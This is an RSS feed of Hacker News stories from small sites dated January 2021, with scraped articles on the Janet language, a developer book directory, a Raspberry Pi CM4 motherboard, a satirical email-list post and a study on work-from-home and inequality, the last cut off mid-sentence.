<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 1]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 1. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Mon, 11 Jan 2021 05:02:28 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-1.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Mon, 11 Jan 2021 05:02:28 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[Why I am Janet]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25699138">thread link</a>) | @galfarragem
<br/>
January 9, 2021 | https://pan.earth/posts/why-i-am-janet.html | <a href="https://web.archive.org/web/*/https://pan.earth/posts/why-i-am-janet.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <p>In this installment I would like to show you in six cases, why is
<a href="https://janet-lang.org/">Janet</a> my programming language of choice.</p>
<h2>Case 1: Immutable or not</h2>
<p>I will start small: Janet has both mutable and immutable data structures for
all three usual suspects. So we have a buffer (mutable) and string (immutable),
also table (m) and struct (i), and indeed the array (m) and tuple (i). I
can understand the argument for immutable data, and respect it, but I love
the choice. Janet gives me that on every step, and yet guide me by its design.</p>
<h2>Case 2: Metal</h2>
<h3>C</h3>
<p>The fundamental property of the Janet language is the low-level nature of
the language implementation. C is the programming language used to implement
lots of parts; its parser, compiler, the virtual machine and a lot of the
functionality in the standard library.</p>
<p>This choice not only makes Janet fast and efficient, but it also brings
inspectability and transparency of the underlying mechanisms. Another benefit
is that there is the header file for the Janet C API, with which it is not
that hard to build your own C code or wrap some existing C code into your
library or embed Janet in other C program.</p>
<h3>Print</h3>
<p>In the spirit of the best Unix programs printing to the stdout is the
first-class citizen in the Janet language. For example, templating language
<a href="https://git.sr.ht/~bakpakin/temple">Temple</a> by the creator of the language
just prints. In the
<a href="https://github.com/janet-lang/spork/blob/master/spork/fmt.janet">formatting part</a>
of the <a href="https://github.com/janet-lang/spork">Spork</a>'s library base function
prints. The standard library has many functions for better work with the
printing, e.g. redirecting output.</p>
<h3>Threads</h3>
<p>The threads are also part of the core of the language. You can say what you
want when <a href="https://shouldiusethreads.com/">you should use the threads</a>
but sometimes it is very convenient to spin up threads for the hard
work. Especially if the threads are more similar to the erlang processes than
to the standard OS threads. Still, you have to use them safely, because of
the race conditions and locks.</p>
<h2>Case 3: OOP</h2>
<p>Now you have to think I have gone crazy. OOP in the functional language,
isn't it anti-pattern? I do not think so. Once I have been to
<a href="https://www.youtube.com/watch?reload=9&amp;v=uNPdZm5oF_E">talk</a> which
compared all three main paradigms. I took away that every paradigm has its
place and time for usage.</p>
<h3>Prototypes</h3>
<p>The OOP in Janet is the prototype-based one and backed by the table data
structure. You can easily set the prototype for the table with some properties
or behaviour, which is then inherited by your table.</p>
<h3>Messages</h3>
<p>The syntax for sending messages is easy. Call the keyword with the object
you are calling the message on as the first argument. This syntax is often
confusing for the people coming from the Clojure, because they can be used to
get the value from hashmap this way.</p>
<h3>Abstracts</h3>
<p>One exciting possibility emerging from this concept is that you can easily
teach messaging to your JanetAbstract objects written in the C language. Then
you have programs written in C looking just like ordinary Janet objects.</p>
<h2>Case 4: PEG</h2>
<p>As you may remember from the
<a href="https://pan.earth/posts/how-i-became-janet.html">How I became Janet</a>
post I was avid Rubyist. One of the quotes from Matz I like a lot is:</p>
<blockquote>
<p>There are only three things certain in programmers life:
taxes, death and parsing text.</p>
</blockquote>
<p>For this purpose, Janet uses
<a href="https://bakpakin.com/writing/how-janets-peg-works.html">PEG</a>. If you are
not sure, read the article to understand the concept better. With it, you
can create a small state machines, which can scan, parse and transform the
text into another form of the data.</p>
<h3>Oh so core</h3>
<p>What I love a lot about this particular implementation? That it is part of the
core of the language, again, you guessed, written in C. The PEG definition's
syntax is pure Janet code, very similar to how you write macros with all the
quoting, quasiquoting and unquoting. Its learning curve is steep, especially
if you strive for very optimal definitions, but once you get feel of it,
you will never look the same on a string of text. And you will finally
understand why you hated regex so much.</p>
<h3>Command and conquer</h3>
<p>One use case, where PEG shines for my particular interest is parsing the
interactive commands user input, mostly in TUI applications. I will discuss
this more in one later post, where I will write about my projects.</p>
<h2>Case 5: Dynamic</h2>
<h3>Environment</h3>
<p>The environment is just a Janet table, that holds all loaded bindings. The
one called root is used as a base, when you want to create a new one, for
example for the new fiber, you are creating, or when you are compiling your
code by hand.</p>
<h3>Modules and Loaders</h3>
<p>As is a custom in many languages, Janet has modules system to separate concerns
and divide code into smaller parts. By default, one source file maps to one
module and contains bindings and the environment. By importing a module, you
bring these to the current environment. But there are many other mechanisms,
how you can make this your own, some of them I will show in this part.</p>
<p>The loader is a mechanism that imports modules into the
environment. Interestingly, you can have loader not just for the Janet code,
image and native modules, but for whatever syntax. One lovely example is
the Temple library, which uses them to load your HTML (or any other) templates.</p>
<h3>Fibers</h3>
<p>The concept is very similar to the coroutines in other languages with one
caveat: it is also one of the base building blocks of the language and the
virtual machine. The fact also supports this: fiber contains a mechanism
for signalling, which helps differentiate the fiber's return, called
yielding. One of the usages touted by the language creator is capturing error
in the fiber's code, returned to the calling fiber. Yes, you are always in
the fiber, when you have Janet code running.</p>
<p>Right now the development version of the language contains generators,
based on fibers. Generators are similar to the Python ones, but due to the
status of the fibers as the first-class citizens of the language, they are
more natural in my view.</p>
<h3>ev</h3>
<p>Experimental and developing feature of the language added just in the latest
minor update, but great potential for the future. Maybe you already know what
it is: event loop in the core of the language! Just say how cool is that, and
with fibers as building blocks, it shines for anything async you throw at it
(if it does not block that is). Even as I am very excited about this feature,
I would rather wait for a little for it to mature and show all its facets.</p>
<h3>Compiling</h3>
<p>I know what you think; pepe just got out of ideas. No, I do not want to talk
about the fact, that Janet compiles the source code into virtual machine
bytecode, what I want to convey is that there is absolutely nothing wrong
for you as a programmer to grab some AST (probably provided by the language
parser) compile it and run compiled code. Or use some of the higher-level
mechanisms already present in the standard library as dofile or require.</p>
<p>I just used my minimal knowledge of programming language design to develop
Janet <a href="https://git.sr.ht/~pepe/jlnt.kak">linter</a> for the Kakoune editor,
which probably is not the best linter around, but works great for me.</p>
<p>And not only code but even PEGs you can compile for faster and more efficient
run, when their time comes.</p>
<h3>Macros</h3>
<p>As any other Lisp, and many other languages Janet has macros. With all said
above, I am not afraid of writing them and even use them in a way, that will
up many brows, I fear. Yes, we can use macros! Deal with it.</p>
<h2>Case 6: Grab bag</h2>
<h3>Tables</h3>
<p>As you may understand now, tables are everywhere in the language OOP,
environment and other places, and frankly quite common in other langs. So? In
my opinion, Janet's ones are top-notch, similarly to fibers, because they
are the very basic building block of the language design.</p>
<h3>Repl keys</h3>
<p>Standard Janet repl has already coded a lot of shortcut keys for navigating
and modifying input text. One of the good outcomes of this feature is that
all those are also present in standard library getline function. But for me,
there are two I use a lot and refuse to switch to remote repl from the editor:</p>
<ul>
<li>
<p>tab completes the binding you have started, even showing you the options,
when there are more than one.</p>
</li>
<li>
<p>ctrl+g shows the documentation for binding
under the cursor! You may know that thought: is the separator first or the
last parameter to this fn?</p>
</li>
</ul>
<p>And both are present when you use standard library getline; you provide the
table with bindings.</p>
<h3>Loop</h3>
<p>In the standard library, there is a macro loop, which is similar to those
in other Lisps. It also has sister macro seq, which gathers all the results
from all runs. I do not use it very often, but when I do, I praise it.</p>
<h2>To be continued ...</h2>
<p>That's all folks for this part. Next will be again little bit more
philosophical.</p>
<p>To understand all this better, be sure to read the
<a href="https://pan.earth/posts/how-i-became-janet.html">first installment</a>.</p>

    </div></div>]]>
            </description>
            <link>https://pan.earth/posts/why-i-am-janet.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25699138</guid>
            <pubDate>Sat, 09 Jan 2021 10:15:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: DevBooks – Help Developers find indy books]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 9 (<a href="https://news.ycombinator.com/item?id=25698707">thread link</a>) | @simon-holdorf
<br/>
January 9, 2021 | https://thesmartcoder.dev/books/ | <a href="https://web.archive.org/web/*/https://thesmartcoder.dev/books/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-server-rendered="true" id="__nuxt"><!----><div id="__layout"><div data-app="true" id="app" data-v-8b44678a=""><div> <main data-v-8b44678a=""><div><div data-v-405cec28="" data-v-8b44678a=""><div><div data-v-405cec28=""><div data-v-405cec28=""><div> <p data-v-405cec28="">
        Find the best books for developers.
      </p></div></div></div></div></div> <div data-v-8b44678a=""><div data-v-58ecdbbb="" data-v-8b44678a=""><div data-v-58ecdbbb=""><div data-v-58ecdbbb=""><div data-v-58ecdbbb=""><div data-v-58ecdbbb=""><div data-v-58ecdbbb=""><div data-v-58ecdbbb=""><h2>What is DevBooks?</h2> <p>DevBooks helps developers to find the best books for developers and authors to showcase their amazing work. </p></div></div> </div> <div data-v-58ecdbbb=""><div data-v-58ecdbbb=""><div xs="12"><div> <div><h2>
        A React Developer’s Guide to Hooks
      </h2> <p>by Sebastien Castiel</p> <p>
        React Hooks are awesome, but they are not easy to use every day.
In my experience with React and hooks, I have faced a lot of issues, spent some time debugging to understand where these issues came fr...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Practical Test Automation
      </h2> <p>by Panos Matsinopoulos</p> <p>
        Learn the principles behind test-driven development (TDD) and behavior-driven development (BDD) and see how Jasmine, RSpec and Cucumber can be used to your advantage. This book examines some of the le...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        The Jest Handbook
      </h2> <p>by Hugo Di Francesco</p> <p>
        Learn Advanced JavaScript Testing patterns with Jest.

Take your JavaScript testing to the next level by learning the ins and outs of Jest, the top JavaScript testing library.
      </p></div>  </div></div><div xs="12"><div> <div><h2>
        Practical Bootstrap
      </h2> <p>by Panos Matsinopoulos</p> <p>
        Learn to use one of the most popular CSS frameworks and build mobile-friendly web pages. Used for numerous websites and applications, Bootstrap is a key tool for modern web development.
      </p></div>  </div></div><div xs="12"><div> <div><h2>
        The Coding Career Handbook
      </h2> <p>by Shawn Swyx Wang</p> <p>
        10 hours of audio. 40 chapters. 450+ pages. 1,400+ links to original sources curated over 3 years. Priceless insights from dozens of developers at the top of their fields. Proven ideas, tested by pers...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        The Tech Resume Inside Out
      </h2> <p>by Gergely Orosz</p> <p>
        What a good developer resume looks like, and how to write one. I've reviewed hundreds of developer resumes at tech companies like Microsoft, Skype, and Uber. This guide helps you craft a developer res...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Code Your Way Up
      </h2> <p>by Greg Thomas</p> <p>
        Code Your Way Up is the book for new developers looking to get started in software and asks the hard questions on growth, delivery, and initiative and what you need to think of in order to succeed.  I...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Lean from the Trenches
      </h2> <p>by Henrik Kniberg</p> <p>
        You know the Agile and Lean development buzzwords, you’ve read the books. But when systems need a serious overhaul, you need to see how it works in real life, with real situations and people. Lean fro...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        How to Get a Job in Web Development
      </h2> <p>by RealToughCandy</p> <p>
        "How to Get a Job in Web Development" is designed for junior web developers. 
In this book, you will learn how to:

• Expertly craft the ‘holy clover’ of application materials: your resume, cover lett...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Master HTML &amp; CSS
      </h2> <p>by Panos Matsinopoulos</p> <p>
        Want to become a Web developer? HTML and CSS are a must for your foundation. And this book takes you from zero to advanced level. From classical hello world things to how you can position elements on ...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Letters To a New Developer
      </h2> <p>by Dan Moore</p> <p>
        Learn what you need to succeed as a developer beyond the code. The lessons in this book will supercharge your career by sharing lessons and mistakes from real developers. 

Wouldn’t it be nice to lear...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        How To Host, Secure, and Deliver Static Websites on Amazon Web Services
      </h2> <p>by Kyle Galbraith</p> <p>
        "How To Host, Secure, and Deliver Static Websites on Amazon Web Services" is a book and video course that cuts through the sea of information to accelerate your learning of AWS. Giving you a learning ...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        The Road to GraphQL
      </h2> <p>by Robin Wieruch</p> <p>
        The Road to GraphQL is your personal journey to master pragmatic GraphQL in JavaScript. The book is full with applications you are going to build along the way with React.js and Node.js. Afterward, yo...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Portfolio Surgery
      </h2> <p>by RealToughCandy</p> <p>
         In Portfolio Surgery, you'll start with a massive upgrade of the look and feel of your portfolio. You'll learn about common pitfalls, dos and don'ts, and portfolio optimization techniques. Then, in t...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Pure React
      </h2> <p>by Dave Ceddia</p> <p>
        Learning new skills is one of the best ways to invest in yourself.

Knowing React can be the deciding factor in getting hired for a new job, or set you up for a promotion at your current one.

You cou...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        The Good Parts of AWS
      </h2> <p>by Daniel Vassallo</p> <p>
        This is a book by Daniel Vassallo and Josh Pschorr. Between us, we have worked with AWS for 15 years, including 11 years working inside AWS. We have worked on all sorts of web applications, from small...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Practical Vavr
      </h2> <p>by Alexandre Grison</p> <p>
        Practical Vavr is all about making you want to use Vavr in your day to day Java programming.

If you want to improve the quality of your code by using a well-thought and beautifully designed functiona...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Your First Year in Code
      </h2> <p>by Isaac Lyman</p> <p>
        Starting a career in programming can be intimidating. Whether you're switching careers, joining a boot camp, starting a C.S. degree, or learning on your own, Your First Year in Code can help, with pra...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Building an Effective Dev Portfolio
      </h2> <p>by Josh Comeau</p> <p>
        I got so many replies! A couple hundred developers were willing to share their portfolios with me, and I went through as many as I could over the next couple of weeks. I found I kept giving the same f...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        PHP Mentors - Advice from PHP Experts around the world
      </h2> <p>by Flávio Silveira</p> <p>
        Answers from PHP masters around the world for your questions.
Code, Career, Team work, Working environment, Logs, Tests, Future and much more.

PHP Mentors Book is a set of questions with topics that ...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        The Case of IBM 386 PC: A Detective Story for Techies
      </h2> <p>by Jim Grep</p> <p>
        Take a break, have some fun reading a tech mystery story on programming--a first of its kind. A nostalgic story from the early days of IBM PC when some programmers get together to play detective and h...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Freelance Newbie
      </h2> <p>by RealToughCandy</p> <p>
        Are you ready to jump-start your freelance web development career? Freelance Newbie has you covered! In this book, you’ll learn practical, actionable steps you can start using TODAY to get your first ...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        14 Habits of Highly  Productive Developers
      </h2> <p>by Zeno Rocha</p> <p>
        You can learn the most popular frameworks, use the best programming languages, and work at the biggest tech companies, but if you cultivate bad habits, it will be hard for you to become a top develope...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Content for Developers
      </h2> <p>by Maedah Batool</p> <p>
        A whole new workflow to Write. Publish. Market. Authentic &amp; professional content writing meant for developers. Zero bull-shit and to-the-point tips to improve your technical content writing skills. Le...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        A Smart Guide for Your Career as a Software Engineer
      </h2> <p>by Mike Nikles</p> <p>
        I started my software engineer career 20 years ago. Since then, I have interviewed hundreds of candidates and reviewed even more resumes. This book is a guide for your own career, whether you are new ...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        The Outstanding Developer
      </h2> <p>by Sebastien Castiel</p> <p>
        Being a developer is not only about writing code. And improving as a developer is not only about improving in writing code. This book explores how to become an outstanding developer through several ax...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        5 Little Potions
      </h2> <p>by Mark Wilbur</p> <p>
        In 5 Little Potions, you'll begin your journey into Elixir programming by creating increasingly complex games.

You'll start with a simple guessing game. Next you'll work with Elixir Structs in a boar...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Distributed Systems with Node.js
      </h2> <p>by Thomas Hunter II</p> <p>
        In this hands-on guide, author Thomas Hunter II proves that Node.js is just as capable as traditional enterprise platforms for building services that are observable, scalable, and resilient. Intermedi...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Data Analysis with Rust Notebooks
      </h2> <p>by Dr. Shahin Rostami</p> <p>
        A practical book on Data Analysis with Rust Notebooks that teaches you the concepts and how they're implemented in practice.

- All code examples in Rust,
- Rust (Jupyter) Notebooks for each Section,
...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Python re(gex)?
      </h2> <p>by Sundeep Agarwal</p> <p>
        This book will help you learn Python Regular Expressions, a mini-programming language for all sorts of text processing needs.

The book heavily leans on examples to present features of regular express...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        The Road to React
      </h2> <p>by Robin Wieruch</p> <p>
        In "The Road to React" you will learn about all the fundamentals of React.js with Hooks while building a full-blown React application step by step. While you create the React application, every chapte...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Cloud Native Web Development
      </h2> <p>by Mike Nikles</p> <p>
        In this book, we will walk through the end-to-end process of developing a cloud-native web application. You will learn technologies, processes, tips &amp; tricks and gain hands-on experience. You will fin...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        The Road to Firebase
      </h2> <p>by Robin Wieruch</p> <p>
        The Road to React with Firebase is your personal journey to master advanced React for business web applications in JavaScript whereas Firebase is used to replace everything that you would want from a ...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        The Standout Developer
      </h2> <p>by Randall Kanna</p> <p>
        If you’re tired of the endless job search and feeling like your resume isn’t being seen, this book will help you craft a great resume that stands out and get it seen by the companies you want. I’ll sh...

 …</p></div></div></div></div></div></div></div></div></div></div></div></main></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://thesmartcoder.dev/books/">https://thesmartcoder.dev/books/</a></em></p>]]>
            </description>
            <link>https://thesmartcoder.dev/books/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25698707</guid>
            <pubDate>Sat, 09 Jan 2021 08:43:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Learning Elixir's GenServer with a real-world example]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25698520">thread link</a>) | @kimi
<br/>
January 8, 2021 | https://papercups.io/blog/genserver | <a href="https://web.archive.org/web/*/https://papercups.io/blog/genserver">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://papercups.io/blog/genserver</link>
            <guid isPermaLink="false">hacker-news-small-sites-25698520</guid>
            <pubDate>Sat, 09 Jan 2021 07:57:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Over: Board – Raspberry Pi CM4 ITX Motherboard]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25697993">thread link</a>) | @todsacerdoti
<br/>
January 8, 2021 | https://blog.jmdawson.co.uk/overboard-raspberry-pi-cm4-itx-motherboard/ | <a href="https://web.archive.org/web/*/https://blog.jmdawson.co.uk/overboard-raspberry-pi-cm4-itx-motherboard/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-3401">

	

	<div>
		
<p>The Over:Board is an IO board for the Raspberry Pi Compute Module 4. It is designed to use a standard PC ATX power connector and features a full size PCI-E 16x slot although its only running at 1x bandwidth and unfortunately it is not compatible with a GPU.   <br></p>



<figure><img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201%201'%3E%3C/svg%3E" data-src="https://c0.iggcdn.com/indiegogo-media-prod-cld/image/upload/c_fill,w_762,g_center,q_auto:best,dpr_1.6,f_auto,h_506/fjlirebv3qpqd7xdlsek" alt="The Over:Board" data-old-src="https://c0.iggcdn.com/indiegogo-media-prod-cld/image/upload/c_fill,w_762,g_center,q_auto:best,dpr_1.6,f_auto,h_506/fjlirebv3qpqd7xdlsek" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>The Over:Board</figcaption></figure>



<p><br>It breaks out the following ports: <br></p>



<ul><li>24-pin ATX Power</li><li>40-pin GPIO</li><li>Full Size PCI-E @ 1x bandwidth</li><li>SATA Controller (Powered by USB)</li><li>Front Panel Header</li><li>CPU Fan Header</li><li>UART Header</li><li>Micro USB</li><li>RS232 Com Port</li><li>2x USB 2.0 Ports</li><li>Micro SD card slot</li><li>3.5mm Audio</li></ul>



<p>The Over:Board costs £199 for an early prototype or £99 for the Final Production board and is available to back now on indiegogo. <br></p>



<div><p>Whilst £99 is expensive for a IO board this is likely down to the limited production and it is likely still the cheapest ARM based ITX motherboard on the market even when factoring in the cost of a RPI CM4. </p><p>You can back the Over:Board on indiegogo <a rel="noreferrer noopener" href="https://www.indiegogo.com/projects/over-board-raspberry-pi-4-mini-itx-motherboard#/" target="_blank">here</a></p><p>For another ARM IO board with SATA check out my Nano Pi Neo2 NAS review <a rel="noreferrer noopener" href="https://blog.jmdawson.co.uk/nano-pi-neo2-nas-enclosure-a-small-linux-home-server-nas/" target="_blank">here</a></p><p>The project currently has £1654 in backing from 11 backers. With 28 days left it is looking likely to hit its £5000 target. </p><p>Ross Nicoholls is leading the campaign: </p></div>



<blockquote><p>I’ve lost count exactly how many, but this will be about my 35th commercial electronics PCB to be manufactured, so I am no stranger to getting these things to market. That said however, this will be the first of my own venture so represents my most exciting project to date and something I feel very passionate about.</p><cite>Ross has lots of experience in this field</cite></blockquote>



<p>I wish Ross good luck and hope to see the Over:Board available soon! </p>

	</div><!-- .entry-content -->

	<!-- .entry-footer -->

				
</article></div>]]>
            </description>
            <link>https://blog.jmdawson.co.uk/overboard-raspberry-pi-cm4-itx-motherboard/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25697993</guid>
            <pubDate>Sat, 09 Jan 2021 06:31:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to grow your email list to three subscribers]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25697859">thread link</a>) | @nadermx
<br/>
January 8, 2021 | https://johnathannader.com/how-grow-your-email-list-three-subscribers/ | <a href="https://web.archive.org/web/*/https://johnathannader.com/how-grow-your-email-list-three-subscribers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <div>
    
    <div>
      <div>
        
        <p>john | Jan. 9, 2021, 6:09 a.m.</p>
        <p>Over the past twenty five years as a prolific internet user I have been able to accomplish many feats.&nbsp; Some of which have garnered the attention of governments, others of family members.&nbsp; None of these though are as profound as the truly difficult feat of growing my subscriber list.</p><p>You would think that growing a list to three users would be something down right nearly impossible, as I did too.&nbsp; But in reality it turned out to be even harder than that!</p><p>Don't worry though, I wont lead you down the path of struggles and tribulations to get your self to three subscribers, I will instead show you the light at the end of the tunnel in a quick and simple walk through guide.</p><p>Obviously most people would wonder, "Wow John, how did you do it?" and thankfully I have an answer for you, it's simple really.&nbsp; Build a blog.&nbsp; After you have done this, put a email subscriber list at the bottom.</p><p>But that's not all, oh no I also thought just like I was promised by the field of dreams that if I build it, they will come.&nbsp; That was false, once I built the blog no one came.&nbsp; Thankfully that didn't matter or stop me from getting subscribers.</p><p>Instead once I had done the hard part of building the blog, and putting a email subscriber list on the bottom, I had to do the absolute most terrifying thing.&nbsp; Write a blog post.</p><p>Now of course most of you think, "By golly I'm terrible at writing, how will I ever get to three subscribers?" and for you I have an answer, write a test blog post.&nbsp; Something as complicated as "test blog post".</p><p>I know this may be daunting, but don't worry this will simply get all the pent up subscriber demand frothing at the mouth hoping for your next post.&nbsp; Of course this wont make them subscribe, but this will make you be very well on your way to your first subscriber.</p><p>Once you have made the test blog post, do the impossible.&nbsp; Go from zero to one, subscribe yourself to your blog.</p><p>Now of course this is a monumental moment for your blog and subscriber list.&nbsp; You should in reality pat yourself on the back.&nbsp; You have managed the mathematical improbability of growing at infinity percent.</p><p>Of course once you have relished in the joy that is your first subscriber, then forget you have a blog for a while.&nbsp; This is crucial, as patience is key for success.&nbsp; </p><p>Out of the blue once you get outraged at something in life, then write your second blog post.&nbsp; Call this post, First post.</p><p>To keep the potential subscribers believing that it is in fact your first post, and not the post that brought you from zero to one, delete the test post.&nbsp; Perhaps even maybe have a nice little digital funeral for it in which you wish it the best in the after life, and then move on.</p><p>After you successfully published the First post, do the unthinkable and send it to a friend, specifically asking them if the newsletter subscription works.<br></p><p>Congratulations, you have now gotten subscriber number two!&nbsp; Look at you go!</p><p>Now I have lead you this far, of course to reach post number three, well I got nothing on that one, that one just simply takes a bit of luck.<br></p>
      
       <p>P.S. Subscribe to my <a href="https://johnathannader.com/newsletter/">newsletter</a> and follow me on <a href="https://twitter.com/nadermx" rel="nofollow noopener" target="_blank">twitter</a></p>
      </div>
    

    </div>
  </div>
</div></div>]]>
            </description>
            <link>https://johnathannader.com/how-grow-your-email-list-three-subscribers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25697859</guid>
            <pubDate>Sat, 09 Jan 2021 06:10:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Expanded work-from-home boosts income for select few, worsening inequality]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25697771">thread link</a>) | @rustoo
<br/>
January 8, 2021 | https://academictimes.com/expanded-work-from-from-home-boosts-income-for-select-few-worsening-inequality-study-finds/ | <a href="https://web.archive.org/web/*/https://academictimes.com/expanded-work-from-from-home-boosts-income-for-select-few-worsening-inequality-study-finds/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div id="articleBody"><p dir="ltr">Giving employees greater ability to work from home increases average income, but the benefit goes mostly to already high-earning workers, new research shows, indicating how policies implemented in response to the coronavirus pandemic could widen economic inequality.</p><p dir="ltr">Published in the <em>Journal of Population Economics</em>, the <a href="https://link.springer.com/article/10.1007/s00148-020-00800-7">paper</a> authored by Italian economists Luca Bonacini, Giovanni Gallo and Sergio Scicchitano found that increasing overall ability to work from home primarily helps workers who are male, older, highly educated and already highly paid.Â&nbsp;</p><p dir="ltr">Before the pandemic, employees who typically worked from home were often female, older, highly educated and living in metropolitan cities.</p><p dir="ltr">Using data from Italyâ€™s 2018 Survey on Labour Participation and Unemployment and the 2013 Italian Survey of Professions, the researchers tested what would happen if work-from-home became the modus operandi rather than a forced innovation. By swapping a 10 percentage point share of employees from a â€œlow feasibilityâ€� level of working from home to a â€œhigh feasibilityâ€� level, average income increased by 1% while the Gini index, a measure of income inequality, increased by 0.4.</p><p dir="ltr">A Gini index of 100 is the maximum level of income inequality; Italy had a Gini index of 35.9 in 2017, according to the World Bank.</p><p dir="ltr">Italy was used as a case study for the paper, published Sept. 12, because it was the first Western country to adopt an economic lockdown to prevent the spread of the coronavirus. The country also showed a particularly dramatic shift toward work-from-home as a result of the pandemic.Â&nbsp;</p><p dir="ltr">Prior to the coronavirus, Italyâ€™s share of remote workers was the lowest of any European country at 1%. As of June, roughly 90% of the countryâ€™s public sector workers were working from home, according to the Italian Minister of Administration.</p><p dir="ltr">Although the researchers relied on data from Italy, they said their findings â€œmay be useful to policymakers in other developed countries as wellâ€� as governments rethink production processes to incorporate more robust work-from-home policies.</p><p dir="ltr">In the U.S., for example, the pandemic quadrupled the number of people working from home to nearly 50% of the total workforce, and many countries are developing pandemic exit plans with continued high levels of work-from-home at the center.</p><p dir="ltr">Many companies, having invested time, energy and money into training and equipment for remote employees, are also likely to expand work-from-home policies even after the threat of COVID-19 has receded. Workers, managers and entrepreneurs have also spent months developing remote-working skills that they are unlikely to give up on, Scicchitano said.</p><p dir="ltr">If working from home becomes the new normal, the researchers said, â€œtemporary income support measures,â€� such as direct financial payments to citizens, â€œwill not be sufficient anymoreâ€� to prevent remote work from exacerbating income inequality.</p><p dir="ltr">Instead, officials need to focus on policies that could better assist employees who work from home, Scicchitano said, such as increased child care facilities and financial support for families, increased the school enrollment rates and improved training courses for employees. Further worsening inequality from large-scale shifts, not every job can be done from home, creating classes of workers lacking in additional benefits that come from doing jobs remotely.Â&nbsp;</p><p dir="ltr">Jobs in finance and insurance, communication and information and professional services â€” typically some of the higher-paying professions â€” can more easily be done remotely than jobs in hotels, restaurants and agriculture, which typically pay less, according to Scicchitano.</p><p dir="ltr">â€œAnd obviously in some sectors, there is a higher share of workers who are able to work from home,â€� he said in an interview with The Academic Times. â€œEven in this case, there are huge inequalities in the labor market.â€�</p><p dir="ltr">The researchers are currently working on a follow-up paper, set to be finished in the next month, investigating the impact that working from home has specifically had on the gender pay 